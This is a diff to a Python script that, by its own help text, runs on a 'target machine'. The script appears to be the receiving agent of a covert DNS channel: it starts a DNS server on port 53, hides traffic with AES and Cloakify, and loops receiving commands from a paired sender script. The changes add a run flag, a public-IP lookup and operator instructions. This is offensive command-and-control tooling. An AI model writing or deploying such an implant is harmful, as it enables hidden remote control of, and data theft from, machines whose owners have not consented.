@@ -1,8 +1,9 @@
 import subprocess
 import os
-import multiprocessing
-import dns_server   
+import argparse
 import time
+
+import requests
 from aes_encrypt import decrypt_message, encrypt_message
 from cloakify import Cloakify
 from decloakify import Decloakify
@@ -81,14 +82,23 @@ def send_response(response):
 
 
 if __name__ == "__main__":
+    ip = requests.get('https://ipinfo.io/ip')
+    parser = argparse.ArgumentParser(
+        description=f"This script must run on the target machine.\n\n1) Make sure that UDP port 53 is open on both Sender and Receiver. \n2) Run this script with the --run parameter. \n3) Run 'python sender.py -d {ip.text}' on the sender script.",
+        formatter_class=argparse.RawTextHelpFormatter 
+    )
+    parser.add_argument('--run', action='store_true', help="Run the server if specified")    
     subprocess.Popen(['python', 'dns_server.py'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    print("Server in attesa di richieste...")
-    while True:
-        try:
-            receive_command() 
-        except Exception as e:
-            print(f'Something wrong happend during the connection: {e}')
-
+    args = parser.parse_args()
+    if args.run:
+        print("Server in attesa di richieste...")
+        while True:
+            try:
+                receive_command() 
+            except Exception as e:
+                print(f'Something wrong happend during the connection: {e}')
+    else:
+        parser.print_help()
 
     
 
